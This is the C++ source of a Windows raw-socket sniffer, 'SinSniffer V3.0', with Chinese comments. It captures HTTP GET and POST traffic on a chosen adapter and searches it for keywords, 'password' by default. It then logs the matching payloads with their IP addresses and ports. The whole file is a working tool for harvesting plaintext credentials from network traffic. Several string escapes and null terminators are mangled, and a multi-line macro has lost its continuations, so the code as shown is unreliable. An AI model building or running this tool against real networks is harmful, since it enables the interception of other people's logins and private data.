
//SinSniffer V3.0  改成使用 RawSoket 的方式获取数据包
/*
   刺探 http 头中可能包含的 信息 。。。
*/
#define _WIN32_WINNT 0x0520
#define _WSPIAPI_COUNTOF
#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <Windows.h>
#include <tchar.h>
#include <Iphlpapi.h>
#include <Mstcpip.h>
#include <process.h>
#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Iphlpapi")
//#pragma comment(linker,"/align:32")
//#define PACKET_FILTER "ip"
/*
-i  “adapter"  -p  "str to search"  -l  "log file"
*/
typedef struct tcp_hdr //定义TCP首部
{
    USHORT th_sport; //16位源端口
    USHORT th_dport; //16位目的端口
    unsigned int th_seq; //32位序列号
    unsigned int th_ack; //32位确认号
    unsigned char th_lenres; //4位首部长度/6位保留字
    unsigned char th_flag; //6位标志位
    USHORT th_win; //16位窗口大小
    USHORT th_sum; //16位校验和
    USHORT th_urp; //16位紧急数据偏移量
} TCPHEADER;
typedef struct ip_address
{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
} ip_address;
/* IPv4 header */
typedef struct ip_header
{
    u_char         ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
    u_char           tos;            // Type of service
    u_short    tlen;            // Total length
    u_short    identification; // Identification
    u_short    flags_fo;        // Flags (3 bits) + Fragment offset (13 bits)
    u_char         ttl;            // Time to live
    u_char      proto;            // Protocol
    u_short     crc;            // Header checksum
    ip_address       saddr;        // Source address
    ip_address     daddr;        // Destination address
    u_int               op_pad;            // Option + Padding
} ip_header;
class CLock  //简单的封装了下关键段
{
public:
    CLock()
    {
        InitializeCriticalSection(&cs);
    }
    ~CLock()
    {
        DeleteCriticalSection(&cs);
    }
public:
    void Lock()
    {
        EnterCriticalSection(&cs);
    }
    void UnLock()
    {
        LeaveCriticalSection(&cs);
    }
    //      BOOL isLock()
    //    {
    //          return !TryEnterCriticalSection(&cs);
    //     }
private:
    CRITICAL_SECTION cs;
};
class CLog
{
public:
    CLog(char *str)
    {
        hfile = CreateFile(str,
                           GENERIC_WRITE | GENERIC_READ,
                           FILE_SHARE_READ
                           , NULL, OPEN_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    }
    ~CLog()
    {
        CloseHandle(hfile);
    }
    DWORD  Write(const char *str, DWORD bytesFormat)
    {
        if (hfile == INVALID_HANDLE_VALUE)
            return 0;
        DWORD         bytesWritten = 0;
        SetFilePointer(hfile, 0, NULL, FILE_END);
        WriteFile(hfile, str, bytesFormat, &bytesWritten, NULL);
        return bytesWritten;
    }
    /*    DWORD  Write(const char *format,...)
    {
    if(hfile == INVALID_HANDLE_VALUE)
    return 0;
    static CLock  m_lock;
    m_lock.Lock();
    int                 bytesFormat = 0;
    DWORD         bytesWritten = 0;
    static char     buff[66535];
    va_list    arg_list;
    va_start(arg_list, format);
    bytesFormat = _vsnprintf(buff, sizeof(buff), format, arg_list);
    va_end(arg_list);
    SetFilePointer(hfile,0,NULL,FILE_END);
    WriteFile(hfile, buff, bytesFormat, &bytesWritten, NULL);
    m_lock.UnLock();
    return bytesFormat;
    }
    */
private:
    HANDLE hfile;
};
CLock  outlock;
CLock  CaptureLock;
PIP_ADAPTER_INFO pAdapterInfo = NULL;
int m_AdpaterCount = 0;
static char   *defaultfilter = "+password0"; //默认的关键词。 。
char   pfilter[1024] = {0}; //过滤关键字 、、//  Filter_Count|filter1|filter2|filter3... ...
char szAndFilter[1024] = {0};
char szOrFilter[1024] = {0};
char   *pLogfile = NULL; //日志文件路径
CLog   *snifferlog = NULL;
volatile  __int64   PacketCount = 0;
volatile  __int64   LoggedCount = 0;  //写log 计数。。
volatile  long       ThreadCount = 0; //线程计数
//BOOL        bIsTimeToExit = FALSE;  //线程退出标识。。
bool          bIsCharCase = false;  //是否区分大小写
ULONG    m_BindOnIp = 0;
SOCKET  m_CaptureSocket = INVALID_SOCKET;
char  htonc(char ch)
{
    return  char(((ch & 0xF0) >> 4) | ((ch & 0x0F) << 4));
}
BOOL  MyStrstr(char *str)  //  查找字符串中是不是出现了 全局变量 pfilter 中定义的关键词 。。。
{
    char *szAnd = szAndFilter;
    while (*szAnd)
    {
        char *pres = strstr(str, szAnd);
        if (!pres)
            return FALSE;
        szAnd += strlen(szAnd) + 1;
    }
    if (szAnd != szAndFilter)
    {
        return TRUE;
    }
    char *szOr = szOrFilter;
    while (*szOr)
    {
        char *pres = strstr(str, szOr);
        if (pres)
            return TRUE;
        szOr += strlen(szOr) + 1;
    }
    return FALSE;
}
/*
将Source字符串按照指定char分段写如到Dest缓冲区中。
返回值为Source中的下一个段的起点指针
如:
Source = "1234  , 321, 43,333"
Dest将得到 "1234"
返回指针指向" 321, 43,333"
*/
const TCHAR *TakeOutStringByChar(IN const TCHAR *Source, OUT TCHAR *Dest, int buflen, TCHAR ch, bool space)
{
    if (Source == NULL)
        return NULL;
    const TCHAR *p = _tcschr(Source, ch);
    if (space == false)
    {
        while (*Source == ' ')
            Source++;
    }
    int i = 0;
    for (i = 0; i < buflen && *(Source + i) && *(Source + i) != ch; i++)
    {
        Dest[i] = *(Source + i);
    }
    if (i == 0)
        return NULL;
    else
        Dest[i] = '0';
    const TCHAR *lpret = p ? p + 1 : Source + i;
    if (space == false)
    {
        while (Dest[i - 1] == ' ' && i > 0)
            Dest[i-- -1] = '0';
    }
    return lpret;
}
#define AddFilter(pFilterBuffer,szFilter)  {
int len = strlen(szFilter);
if (len)
{
    static    int offset = 0;
    memcpy(pFilterBuffer + offset, szFilter, len + 1);
    offset += (len + 1);
}
}
//将 +str,-str1,+str2,-str3 转化为 mMust
BOOL  BuildFilter(const char *str)
{
    const TCHAR *ps = str;
    TCHAR szFilter[MAX_PATH];
    while ( ps = TakeOutStringByChar(ps, szFilter, MAX_PATH, ',', FALSE))
    {
        //        _tprintf(_T("%srn"),szFilter);
        switch (szFilter[0])
        {
        case '+':
        {
            AddFilter(szAndFilter, szFilter + 1);
        }
        break;
        case '-':
        {
            AddFilter(szOrFilter, szFilter + 1);
        }
        break;
        default:
            break;
        }
    }
    if (!szAndFilter[0] && !szOrFilter[0])
        return FALSE;
    return true;
}
void ShowFilter(char *pFilterBuffer)
{
    char *str = pFilterBuffer;
    while (*str)
    {
        printf("t%srn", str);
        str += strlen(str) + 1;
    }
    if (str == pFilterBuffer)
        printf("t无关键词!rn");
}
bool  TestChar(char  ch)  //  是不是可显示字符  33-126 大概是这个范围
{
    if (ch < 33 || ch > 126)
    {
        return false;
    }
    return true;
}
//多线程的嗅探器。
unsigned __stdcall   CaptureThread(LPVOID lparam)
{
    InterlockedIncrement(&ThreadCount);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    //    printf("%d  OK!!!n",GetCurrentThreadId());
    char buffer[66535] = {0};
    char OutBuffer[65535] = {0};
    //    SOCKET  s = (SOCKET)lparam;
    if (m_CaptureSocket == INVALID_SOCKET)
    {
        goto _ThreadEnd;
    }
    char    buff[0xFFFF];
    int  ret = 0;
    do
    {
        ret = recv(m_CaptureSocket, buff, sizeof(buff), 0);
        if (ret)
        {
            InterlockedIncrement64(&PacketCount);
            if (ret < 64)
            {
                continue;
            }
            ip_header *pIphdr = (ip_header *)buff;
            if (pIphdr->proto != 0x6)
            {
                continue;
            }
            int ip_len = (pIphdr->ver_ihl & 0xf) * 4;
            if (ip_len <= 0 || ip_len >= 60 )
            {
                //    printf("Ip headr len too short or too long !!rn");
                continue;
            }
            TCPHEADER *tcphdr = (TCPHEADER *) ((u_char *)pIphdr + ip_len);
            int tcphd_len = htonc(tcphdr->th_lenres) * 4;
            if (tcphd_len <= 0 || tcphd_len > 65535 )
            {
                //    printf("tcp header too short or too long !!rn");
                continue;
            }
            char     *tcpData = (char *)(((char *)tcphdr) + tcphd_len);
            u_int      DataLen = ret - ip_len - tcphd_len;
            if (DataLen < 65 || DataLen > 0xFFFF) //  包含密码的数据包一般都很长。。。
                continue;
            {
                BOOL  bIsRightPacket = FALSE;
                if (tcpData[0] == 'G')   //只处理 GET 和 POST 请求。。
                {
                    if (tcpData[1] == 'E' && tcpData[2] == 'T')
                        bIsRightPacket = TRUE;
                }
                else if (tcpData[0] == 'P' && tcpData[1] == 'O' && tcpData[2] == 'S' && tcpData[3] == 'T')
                {
                    bIsRightPacket = TRUE;
                }
                if (!bIsRightPacket)
                    continue;
                //这里几乎可以确定是 http 头了。
                if (DataLen > 50)  //貌似这样可以更快点 因为有的网页是加密的 ，，，
                {
                    if (!TestChar(tcpData[100]))
                    {
                        tcpData[100] = '0';
                        DataLen = 100;
                    }
                }
                if (DataLen > 200)
                {
                    if (!TestChar(tcpData[200]))
                    {
                        tcpData[200] = '0';
                        DataLen = 200;
                    }
                }
                memcpy(OutBuffer, tcpData, DataLen);
                OutBuffer[DataLen - 1] = '0';
                char *pOut = OutBuffer;
                if (!bIsCharCase) //如果不区分大小写，
                {
                    memcpy(buffer, tcpData, DataLen);
                    buffer[DataLen - 1] = '0';
                    pOut = _strlwr(buffer);
                }
                if (MyStrstr(pOut))
                {
                    SYSTEMTIME  st;
                    GetLocalTime(&st);
                    int count = sprintf(buffer,
                                        "%d %d %d %d:%d:%d  Len : %u Bytes %u:%u:%u:%u:%u ---> %u:%u:%u:%u:%u rn%s rn",
                                        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
                                        DataLen,
                                        pIphdr->saddr.byte1,
                                        pIphdr->saddr.byte2,
                                        pIphdr->saddr.byte3,
                                        pIphdr->saddr.byte4,
                                        htons(tcphdr->th_sport),
                                        pIphdr->daddr.byte1,
                                        pIphdr->daddr.byte2,
                                        pIphdr->daddr.byte3,
                                        pIphdr->daddr.byte4,
                                        htons(tcphdr->th_dport),
                                        OutBuffer);
                    outlock.Lock();
                    if (pLogfile)
                        snifferlog->Write(buffer, count);
                    ++LoggedCount;
                    printf("%s", buffer);
                    outlock.UnLock();
                }
            }
        }
    }
    while (ret > 0);
_ThreadEnd:;
    InterlockedDecrement(&ThreadCount);
    return ret;
}
bool  GetAndShowAdpaterInfo()
{
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;
    pAdapterInfo = (IP_ADAPTER_INFO *) malloc( sizeof(IP_ADAPTER_INFO) );
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    int result = GetAdaptersInfo( pAdapterInfo, &ulOutBufLen);
    if (result == ERROR_BUFFER_OVERFLOW)   //如果不止一块网卡就会出现这种情况
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *) malloc (ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            printf("Error allocating memory needed to call GetAdaptersinfon");
            return false;
        }
        result = GetAdaptersInfo( pAdapterInfo, &ulOutBufLen);
    }
    if (result == ERROR_SUCCESS)
    {
        pAdapter = pAdapterInfo;
        while (pAdapter)
        {
            printf("%d.======================================n", m_AdpaterCount);
            printf("tAdapter Name: t%sn", pAdapter->AdapterName);
            printf("tAdapter Desc: t%sn", pAdapter->Description);
            printf("tAdapter Addr: t");
            for (UINT i = 0; i < pAdapter->AddressLength; i++)
            {
                if (i == (pAdapter->AddressLength - 1))
                    printf("%.2Xn", (int)pAdapter->Address[i]);
                else
                    printf("%.2X-", (int)pAdapter->Address[i]);
            }
            //        IP_ADDR_STRING *pIpString = &pAdapter->IpAddressList;
            //            do
            //        {
            printf("tIP Address: t%sn", pAdapter->IpAddressList.IpAddress.String);
            printf("tIP Mask: t%sn", pAdapter->IpAddressList.IpMask.String);
            //        pIpString = pIpString->Next;
            //        }while(pIpString);
            //        pIpString = &pAdapter->GatewayList;
            //        do
            //        {
            printf("tGateway: t%sn", pAdapter->IpAddressList.IpAddress.String);
            //            pIpString = pIpString->Next;
            //        }while(pIpString);
            if (pAdapter->DhcpEnabled)
            {
                printf("tDHCP Enabled: Yesn");
            }
            else
                printf("tDHCP Enabled: Non");
            if (pAdapter->HaveWins)
            {
                printf("tHave Wins: Yesn");
                printf("ttPrimary Wins Server: t%sn", pAdapter->PrimaryWinsServer.IpAddress.String);
                printf("ttSecondary Wins Server: t%sn", pAdapter->SecondaryWinsServer.IpAddress.String);
            }
            else
                printf("tHave Wins: Non");
            pAdapter = pAdapter->Next;
            ++m_AdpaterCount;
        }
        if (m_AdpaterCount)
        {
            --m_AdpaterCount;
            return true;
        }
        return false;
    }
    else
    {
        printf("GetAdaptersInfo failed with error: %dn", dwRetVal);
        if (pAdapterInfo)
            free(pAdapterInfo);
        pAdapterInfo = NULL;
        return false;
    }
}
void  Usage()
{
    printf("\t\t\t\tSSniffer.exe  By :Sincoder \n"
           "\t\t\tQQ:1220145498  Blog:www.sincoder.com\n"
           "Usage:\n"
           "SSniffer.exe   [选项]\n"
           "选项:"
           "\t-i [网卡序号]\n"
           "\t-p [需要在数据包中查找的关键词,关键词之间以  , 分割]\n"
           "\t   [关键词前+号表示且关系，-表示或关系]\n"
           "\t-c [关键词区别大小写]\n"
           "\t-l [日志文件]\n"
           "注意：\n"
           "\t必须指定 -i 即网卡序列号 默认的 -p 字符串是 password 关键词不区分大小写 没有日志文件\n");
}
BOOL WINAPI HandlerRoutine(
    DWORD dwCtrlType
)
{
    switch (dwCtrlType)
    {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
    {
        if (m_CaptureSocket != INVALID_SOCKET)
            closesocket(m_CaptureSocket);
        while (ThreadCount)
            if (!SwitchToThread())
                Sleep(10);
        Sleep(5000);  //等待主线程退出 。。。。
    }
    break;
    default:
        break;
    }
    return 0;
}
void  WaitAllThreadExit()
{
    while (ThreadCount)
    {
        Sleep(100);
        outlock.Lock();
        printf("Processed Packets Num : %I64u", PacketCount);
        if (pLogfile)
            printf("t%I64u packets recored  ", LoggedCount);
        printf("r");
        outlock.UnLock();
    }
    if (pLogfile && snifferlog)
        delete snifferlog;
    WSACleanup();
}
int main(int argc, char **argv)
{
    Usage();
    if (!pAdapterInfo)
    {
        printf("网卡信息:n");
        if (!GetAndShowAdpaterInfo())
            printf("获取网卡信息失败 !n");
    }
    if (argc < 3)
    {
        printf("参数输入错误。");
        free(pAdapterInfo);
        return -1;
    }
    int idx = -1; //要打开的网卡序列号。。
    //只有 每个参数 后面都代言 一个参数值 比如 -l log 这样的判断才准确
    for (int i = 2; i < argc; i++)
    {
        if (strcmp(argv[i - 1], "-i") == 0)
        {
            idx = atoi(argv[i]);
        }
        else if (strcmp(argv[i - 1], "-p") == 0)
        {
            int Len = strlen(argv[i]);
            if (Len > 1023)
            {
                printf("关键词过长！！n");
                free(pAdapterInfo);
                return -1;
            }
            memcpy(pfilter, argv[i], Len + 1);
            //pfilter = argv[i];
        }
        else if (strcmp(argv[i - 1], "-l") == 0)
        {
            pLogfile = argv[i];
        }
        //                 else
        //                     if(strcmp(argv[i-1],"-c") == 0)
        //                     {
        //                         bIsCharCase = true;
        //                     }
        else if ((strcmp(argv[i], "-c") == 0) && (strcmp(argv[i - 1], "-p") != 0))
        {
            bIsCharCase = true;
        }
    }

    if (idx < 0)
    {
        free(pAdapterInfo);
        return printf("必须指定 -i 网卡序列号");
    }
    if (m_AdpaterCount < idx)
    {
        printf("网卡序列号输入错误!n");
        free(pAdapterInfo);
        return -1;
    }
    PIP_ADAPTER_INFO  pAdapter = pAdapterInfo;
    while (pAdapter)
    {
        if (idx == 0)
        {
            printf("#使用网卡:nt%stnt%sn", pAdapter->AdapterName, pAdapter->Description);
            printf("#Try to Bind on Ip: t%sn", pAdapter->IpAddressList.IpAddress.String);
            m_BindOnIp = inet_addr(pAdapter->IpAddressList.IpAddress.String);
        }
        pAdapter = pAdapter->Next;
        --idx;
    }
    free(pAdapterInfo);
    if (!*pfilter)
    {
        //pfilter = defaultfilter;
        strcpy(pfilter, defaultfilter);
    }
    if (bIsCharCase)
        printf("#关键词区分大小写\n");
    else
    {
        char *p = _strlwr(pfilter);
        strcpy(pfilter, p);
        printf("#关键词不区分大小写\n");
    }
    if (!BuildFilter(pfilter))
    {
        printf("#关键词错误 。。");
        return -1;
    }
    printf("#且关系关键词:\r\n");
    ShowFilter(szAndFilter);
    printf("#或关系关键词:\r\n");
    ShowFilter(szOrFilter);
    if (pLogfile == NULL)
    {
        printf("#不使用日志文件\n");
    }
    else
    {
        printf("#使用日志文件： %s\n", pLogfile);
        snifferlog = new CLog(pLogfile);
    }
    WSAData wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SetConsoleCtrlHandler(HandlerRoutine, TRUE);
    //bIsTimeToExit = FALSE;
    //设置SOCK_RAW为SIO_RCVALL，以便接收所有的IP包
    int optval = 1;
    int    bytesRet;
    int ret;
    HANDLE  h;
    int j = 0;
    SOCKADDR_IN sa;
    m_CaptureSocket = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if (INVALID_SOCKET == m_CaptureSocket)
    {
        printf("Fail To Create Socket\n");
        goto __faild;
    }
    sa.sin_family = AF_INET;
    sa.sin_port = htons(0);
    sa.sin_addr.S_un.S_addr = m_BindOnIp;
    //printf("Bind On Ip : %s rn",inet_ntoa(sa.sin_addr));
    ret = bind(m_CaptureSocket, (struct sockaddr *)&sa, sizeof(sa));
    if (INVALID_SOCKET == ret)
    {
        printf("#Fail To Bind Socket\n");
        goto __faild;
    }
    ret = WSAIoctl(m_CaptureSocket, SIO_RCVALL, (LPVOID)&optval, sizeof(optval), NULL, 0, (LPDWORD)&bytesRet, NULL, NULL);
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    for (j = 0; j < si.dwNumberOfProcessors * 2; j++)
    {
        h = (HANDLE)_beginthreadex(NULL, 0, CaptureThread, NULL, 0, NULL);
        CloseHandle(h);
    }

    Sleep(1000);  //等待所有线程启动。。。。

    WaitAllThreadExit();
__faild:
    if (pLogfile && snifferlog)
        delete snifferlog;
    if (m_CaptureSocket != INVALID_SOCKET)
    {
        closesocket(m_CaptureSocket);
    }
    WSACleanup();
    printf("All Thread Has Exiting                             nBye!!\n");
    return 0;
}
